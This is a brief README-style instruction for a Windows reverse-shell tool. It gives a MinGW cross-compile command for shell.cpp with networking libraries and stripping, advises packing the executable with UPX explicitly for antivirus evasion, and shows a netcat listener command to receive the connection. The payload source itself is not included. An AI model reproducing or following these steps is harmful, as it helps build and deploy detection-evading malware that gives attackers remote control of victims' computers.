# Compile it
````
i686-w64-mingw32-g++ shell.cpp -o shell.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
````
## After Compile the exe file then use UPX (https://upx.github.io/) for (AV) Evasion


# Start the netcat Listener
````
 nc -lvnp <port number>
 ````
